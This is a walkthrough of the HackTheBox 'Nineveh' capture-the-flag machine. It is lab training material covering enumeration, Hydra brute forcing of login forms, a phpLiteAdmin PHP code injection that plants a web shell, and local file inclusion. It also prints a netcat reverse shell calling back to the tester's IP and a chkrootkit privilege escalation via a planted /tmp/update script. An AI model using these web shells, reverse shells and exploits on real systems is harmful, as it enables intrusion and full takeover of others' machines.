---
title: "Walk-through of Nineveh from HackTheBox"
header:
  teaser: /assets/images/2020-06-24-21-39-01.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - LFI
  - gobuster
  - hydra
  - phpliteadmin
  - chkrootkit
---

## Machine Information

![nineveh](/assets/images/2020-06-24-21-39-01.png)

Nineveh is a medium machine on HackTheBox, which is not too challenging. There are several stages needed to gain an initial foothold, but once a shell is achieved escalation to root is fairly simple. Skills required are an intermediate knowledge of Linux, and enumerating ports and services. Skills learned are HTTP-based brute forcing, chaining exploits, local file inclusion and port knocking.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 0054 - Medium - Nineveh](https://www.hackthebox.eu/home/machines/profile/54) |
| Machine Release Date | 4th August 2017 |
| Date I Completed It | 23rd June 2020 |
| Distribution used | Kali 2020.1 – [Release Info](https://www.kali.org/news/kali-linux-2020-1-release/) |

## Initial Recon

As always, start with Nmap:

```text
root@kali:~/htb/nineveh# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.43 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/htb/nineveh# nmap -p$ports -v -sC -sV -oA europa 10.10.10.43

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 15:41 BST
Initiating Ping Scan at 15:41
Scanning 10.10.10.43 [4 ports]
Completed Ping Scan at 15:41, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:41
Completed Parallel DNS resolution of 1 host. at 15:41, 0.03s elapsed
Initiating SYN Stealth Scan at 15:41
Scanning 10.10.10.43 [2 ports]
Discovered open port 443/tcp on 10.10.10.43
Discovered open port 80/tcp on 10.10.10.43
Completed SYN Stealth Scan at 15:41, 0.05s elapsed (2 total ports)
Initiating Service scan at 15:41
Scanning 2 services on 10.10.10.43
Completed Service scan at 15:41, 12.26s elapsed (2 services on 1 host)
Nmap scan report for 10.10.10.43
Host is up (0.025s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d182 94b8 0210 7992 bf01 e802 b26f 8639
|_SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Have a look at port 80:

![website_port_80](/assets/images/2020-06-24-21-51-35.png)

Just the default Apache page, have a look at port 443:

![website_port_443](/assets/images/2020-06-24-21-52-00.png)

An image, but nothing else interesting, check out the SSL certificate to see what it reveals:

![website_certificate](/assets/images/2020-06-24-21-52-24.png)

We have an email and domain, make note for later. Not a lot here so try gobuster:

```text
root@kali:~/htb/nineveh# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.43

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.43
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/06/22 15:53:38 Starting gobuster
===============================================================
http://10.10.10.43/department (Status: 301)
http://10.10.10.43/server-status (Status: 403)
===============================================================
2020/06/22 15:55:33 Finished
===============================================================
```

Found a sub-folder called department, have a look at that:

![website_department_login](/assets/images/2020-06-24-21-52-50.png)

We have a login page, let's try to brute force with Hydra. We have username admin we saw earlier on the SSL certificate, first capture login attempt in Burp to get info for Hydra:

![burp_repeater](/assets/images/2020-06-24-21-53-16.png)

Use the info above with Hydra:

```text
root@kali:~/htb/nineveh# hydra -t 64 -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-22 16:14:46
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~157 tries per task
[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=^USER^&password=^PASS^:Invalid Password!
[STATUS] 8586.00 tries/min, 8586 tries in 00:01h, 1414 to do in 00:01h, 64 active
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-22 16:15:55
```

We get a password, it's another keyboard walk! Try it on the login page we saw earlier:

![website_login_success](/assets/images/2020-06-24-21-53-55.png)

Not much here, but clicking the Notes button gives us:

![website_department_notes](/assets/images/2020-06-24-21-54-38.png)

We also see this on the address bar:

![website_address_bar](/assets/images/2020-06-24-21-55-06.png)

Send to Burp to have a look for LFI, start by trying to change the value of notes:

![burp_notes_lfi](/assets/images/2020-06-24-21-55-32.png)

Response says no note selected, so not able to traverse directories, but that is an interesting response. Suggests we may be able to enumerate for files that do exist. Try a few variations:

![burp_notes_more_lfi](/assets/images/2020-06-24-21-56-27.png)

We get the same response for any file name, but if we include ninevehNotes.txt (case sensitive) with something before we get a different response:

![burp_notes_lfi_progress](/assets/images/2020-06-24-21-57-26.png)

Error message shows page looks to be using the php function include(), which is easy to exploit allowing us to execute arbitrary code. I found some useful information [here.](https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/)

We need to find a way of getting a php file on to the server. Time to go back to our Nmap at the start and look in more detail at port 443. Start with a gobuster:

```text
root@kali:~/htb/nineveh# gobuster -t 20 dir -k -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.43

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.43
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/06/22 16:44:39 Starting gobuster
===============================================================
https://10.10.10.43/db (Status: 301)
https://10.10.10.43/server-status (Status: 403)
https://10.10.10.43/secure_notes (Status: 301)
===============================================================
2020/06/22 16:50:50 Finished
===============================================================
```

Two interesting folders found, have a look at /db first:

![website_phpliteadmin_login](/assets/images/2020-06-24-21-58-35.png)

Another login page, worth trying Hydra again with the same 100k password list:

```text
root@kali:~/htb/nineveh# hydra -t 64 -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-22 16:52:37
[DATA] max 64 tasks per 1 server, overall 64 tasks, 100011 login tries (l:1/p:100011), ~1563 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-22 16:52:50
```

We get in to the admin page:

![phpliteadmin_successful_login](/assets/images/2020-06-24-21-59-07.png)

There's a well known exploit for phpLiteadmin:

```text
root@kali:~/htb/nineveh# searchsploit phpliteadmin
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
phpLiteAdmin - 'table' SQL Injection                                                                                                                                                         | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                                                                                                                                  | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                                                                                               | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                                                                                                | php/webapps/39714.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

root@kali:~/htb/nineveh# searchsploit -x php/webapps/24044.txt
  Exploit: PHPLiteAdmin 1.9.3 - Remote PHP Code Injection
      URL: https://www.exploit-db.com/exploits/24044
     Path: /usr/share/exploitdb/exploits/php/webapps/24044.txt
File Type: ASCII text, with CRLF line terminators
```

From that:

```text
An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.
```

Google found [this.](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/) Based on the above, the following is a PHP web shell in its simplest form.

```text
<?php system($_GET['cmd']);?>
```

Create a new table called ninevehNotes:

![phpliteadmin_create_db](/assets/images/2020-06-24-21-59-45.png)

Add the above php to the table:

![phpliteadmin_php_cmd](/assets/images/2020-06-24-22-00-02.png)

Rename the database to have php on the end:

![phpliteadmin_rename_db](/assets/images/2020-06-24-22-01-44.png)

We see path to our db is /var/tmp, so try that with an ls:

![website_exploit_fail](/assets/images/2020-06-24-22-02-04.png)

We get an error, go back to the php code and try changing the quotes from single to double:

![phpliteadmin_change_quotes](/assets/images/2020-06-24-22-02-32.png)

Try again and we find it works:

![website_lfi_success](/assets/images/2020-06-24-22-03-02.png)

Time to get a reverse shell, grab this one from [PenTestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and change to my IP:

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 >/tmp/f
```

Now URL encode it:

```text
rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.21+1234+>/tmp/f
```

Start NC listening and then paste the URL in to the website as before:

```text
http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.21+1234+%3E/tmp/f
```

Switch back to terminal and we have a shell:

```text
root@kali:~/htb/nineveh# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.43] 46536
```

Upgrade to a fully interactive shell:

```text
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@nineveh:/var/www/html/department$ ^Z
[1]+  Stopped                 nc -nlvp 1234
root@kali:~/htb/nineveh# stty raw -echo
root@kali:~/htb/nineveh# nc -nlvp 1234
```

We can see the user flag but haven't got the rights to read it yet:

```text
www-data@nineveh:/var/www/html/department$ ls -l /home/amrois/

-rw------- 1 amrois amrois 33 Jul  2  2017 user.txt
www-data@nineveh:/var/www/html/department$ cat /home/amrois/user.txt
cat: /home/amrois/user.txt: Permission denied
```

After having a look around I find a non-standard folder /report with txt files in it:

```text
www-data@nineveh:/var/www/html/department$ ls -l /report/

-rw-r--r-- 1 amrois amrois 4807 Jun 22 17:00 report-20-06-22:17:00.txt
-rw-r--r-- 1 amrois amrois 4807 Jun 22 17:01 report-20-06-22:17:01.txt
-rw-r--r-- 1 amrois amrois 4807 Jun 22 17:02 report-20-06-22:17:02.txt
```

Looks to be a cronjob or similar that is creating them every minute, have a look at contents:

```text
www-data@nineveh:/var/www/html/department$ cat /report/report-20-06-22\:17\:09.txt

ROOTDIR is `/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... not infected
<SNIP>
Searching for suspect PHP files...
/var/tmp/ninevehNotes.php
<SNIP>
Searching for anomalies in shell history files... Warning: `//root/.bash_history' file size is zero
Checking `asp'... not infected
Checking `bindshell'... not infected
Checking `lkm'... not tested: can't exec
Checking `rexedcs'... not found
Checking `sniffer'... not tested: can't exec ./ifpromisc
Checking `w55808'... not infected
Checking `wted'... not tested: can't exec ./chkwtmp
Checking `scalper'... not infected
Checking `slapper'... not infected
Checking `z2'... not tested: can't exec ./chklastlog
Checking `chkutmp'... not tested: can't exec ./chkutmp
Checking `OSX_RSPLUG'... not infected
```

Looks to be something checking for suspicious files/activity. Googling "Searching for anomalies in shell history files" gets [this:](https://books.google.co.uk/books?id=WHcjc42p_MQC&pg=PA379&lpg=PA379&dq=Searching+for+anomalies+in+shell+history+files&source=bl&ots=5azQs1pjvW&sig=ACfU3U0cb9jDBuRqIQPwk07_wAcNJ_rawQ&hl=en&sa=X&ved=2ahUKEwiuhdnGt5bqAhXvShUIHfyjBrgQ6AEwAHoECAgQAQ#v=onepage&q=Searching%20for%20anomalies%20in%20shell%20history%20files&f=false)

![chkrootkit](/assets/images/2020-06-24-22-03-50.png)

This looks to be what we have running on the box, see if we can find it:

```text
www-data@nineveh:/var/www/html/department$ locate chkrootkit
/usr/bin/chkrootkit

www-data@nineveh:/var/www/html/department$ ls -l /usr/bin/chkrootkit
-rwx--x--x 1 root root 76181 Jul  2  2017 /usr/bin/chkrootkit

www-data@nineveh:/var/www/html/department$ chkrootkit
/bin/sh: 0: Can't open /usr/bin/chkrootkit
```

Can't execute as www-data user, search for any exploits:

```text
root@kali:~/htb/nineveh# searchsploit chkrootkit
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                                                                     | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                                                                             | linux/local/33899.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Looks interesting, have a look:

```text
root@kali:~/htb/nineveh# searchsploit -x linux/local/33899.txt
  Exploit: Chkrootkit 0.49 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/33899
     Path: /usr/share/exploitdb/exploits/linux/local/33899.txt
File Type: ASCII text, with CRLF line terminators
```

In there we find:

```text
Steps to reproduce:
- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)
Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.
```

Looks promising, create the update file in tmp with using the same reverse shell command as before:

```text
www-data@nineveh:/tmp$ cat update
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1235 >/tmp/f
www-data@nineveh:/tmp$ chmod +x update
```

Start NC listening in another terminal and wait for it:

```text
root@kali:~/htb/nineveh# nc -nlvp 1235
listening on [any] 1235 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.43] 34250
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

Get the flags:

```text
# cat /home/amrois/user.txt
82a864f9eec2a76c166ec7b1078ca6c8

# cat /root/root.txt
8a2b4956612b485720694fb45849ec3a
```

## Alternate method using port knocking

If I look back to the gobuster scan we did on https earlier, I see there was a folder called secure_notes that we never looked at, so do that now:

![secure_notes_picture](/assets/images/2020-06-24-22-04-17.png)

All that we see is a png file, which in a CTF is suspicious. Grab it and have a look with binwalk:

```text
root@kali:~/htb/nineveh# wget --no-check-certificate https://10.10.10.43/secure_notes/nineveh.png
--2020-06-23 17:35:33--  https://10.10.10.43/secure_notes/nineveh.png
Connecting to 10.10.10.43:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2891984 (2.8M) [image/png]
Saving to: ‘nineveh.png’
nineveh.png                                                100%[=======================================================================================================================================>]   2.76M  4.19MB/s    in 0.7s
2020-06-23 17:35:34 (4.19 MB/s) - ‘nineveh.png’ saved [2891984/2891984]

root@kali:~/htb/nineveh# binwalk nineveh.png
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)
```

PNG looks to have something hidden inside, try extracting:

```text
root@kali:~/htb/nineveh# binwalk -e nineveh.png

root@kali:~/htb/nineveh# ls
europa.gnmap  europa.nmap  europa.xml  nineveh.png  _nineveh.png.extracted

root@kali:~/htb/nineveh# cd _nineveh.png.extracted/
root@kali:~/htb/nineveh/_nineveh.png.extracted# ls -l
-rw-r--r-- 1 root     root       10240 Jun 23 17:36 2BF8D0.tar
-rw-r--r-- 1 root     root           0 Jun 23 17:36 54
-rw-r--r-- 1 root     root     2891900 Jun 23 17:36 54.zlib
drwxr-xr-x 2 www-data www-data    4096 Jul  2  2017 secret

root@kali:~/htb/nineveh/_nineveh.png.extracted# cd secret/
root@kali:~/htb/nineveh/_nineveh.png.extracted/secret# ls
nineveh.priv  nineveh.pub

root@kali:~/htb/nineveh/_nineveh.png.extracted/secret# cat nineveh.priv
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----

root@kali:~/htb/nineveh/_nineveh.png.extracted/secret# cat nineveh.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
root@kali:~/htb/nineveh/_nineveh.png.extracted/secret#
```

We have the private and public RSA keys for the user amrois, but when we scanned earlier port 22 wasn't open, try any way just in case we missed it:

```text
root@kali:~/htb/nineveh/_nineveh.png.extracted/secret# chmod 600 nineveh.priv

root@kali:~/htb/nineveh/_nineveh.png.extracted/secret# ssh -i nineveh.priv amrois@10.10.10.43
ssh: connect to host 10.10.10.43 port 22: Connection timed out
```

Earlier when we clicked on the Notes button on the Departments page we had this message:

![website_department_notes](/assets/images/2020-06-24-21-54-38.png)

That and the RSA keys mean we know there is a user amrois on the box, further enumeration of the file system using our LFI gets us to this email:

![website_amrois_mail](/assets/images/2020-06-24-22-06-04.png)

This confirms that SSH is hidden on the box until we use port knocking to open it up:

```text
root@kali:~/htb/nineveh/_nineveh.png.extracted/secret# for x in 571 290 911; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43; done && ssh -i nineveh.priv amrois@10.10.10.43

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 21:47 BST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.
PORT    STATE    SERVICE
571/tcp filtered umeter
Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 21:48 BST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.
PORT    STATE    SERVICE
290/tcp filtered unknown
Nmap done: 1 IP address (1 host up) scanned in 1.16 seconds

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 21:48 BST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.
PORT    STATE    SERVICE
911/tcp filtered xact-backup
Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds

Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
133 packages can be updated.
66 updates are security updates.
You have mail.
Last login: Tue Jun 23 15:39:05 2020 from 10.10.14.26
```

We're in as user amrois, and can now proceed as before using the chkrootkit exploit to escalate privileges to root.

All done. See you next time.
